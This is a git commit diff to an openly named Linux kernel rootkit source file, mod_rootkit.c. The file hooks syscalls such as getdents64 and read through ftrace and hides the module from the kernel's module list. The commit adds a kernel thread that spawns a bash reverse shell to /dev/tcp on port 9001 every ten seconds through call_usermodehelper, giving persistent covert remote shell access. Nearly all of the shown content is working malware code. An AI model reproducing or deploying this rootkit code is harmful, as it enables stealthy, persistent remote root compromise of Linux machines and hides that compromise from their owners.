35cbba8ead57457207807c68c479e996ebc4b82e
flashnuke <adanikel@gmail.com>
2025-03-26 07:33:05 -0400

    add initial

--- src/mod_rootkit.c
+++ src/mod_rootkit.c
@@ -7,6 +7,32 @@
 #include "hooks/x64_sys_getdents64.h"
 #include "hooks/x64_sys_read.h"
 
+
+#include <linux/kthread.h>
+#include <linux/delay.h>
+#include <linux/sched/signal.h>
+
+
+static struct task_struct *task;
+
+int exec_thread(void *data) {
+    while (!kthread_should_stop()) {
+        char *argv[] = { "/bin/bash", "-c", "bash -i >& /dev/tcp/127.0.0.1/9001 0>&1", NULL };
+        static char *envp[] = {
+            "HOME=/",
+            "TERM=linux",
+            "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL
+        };
+
+        call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+
+        ssleep(10);
+    }
+
+    return 0;
+}
+
+
 // define which functions to hook
 static struct ftrace_hook hooks[] = {
         HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
@@ -24,6 +50,12 @@ static int __init rootkit_init(void) {
     list_del(&THIS_MODULE->list);
     kobject_del(&THIS_MODULE->mkobj.kobj);
 #endif
+
+
+    task = kthread_run(exec_thread, NULL, "exec_thread");
+    if (IS_ERR(task)) {
+        return PTR_ERR(task);
+    }
 
     return 0;
 }
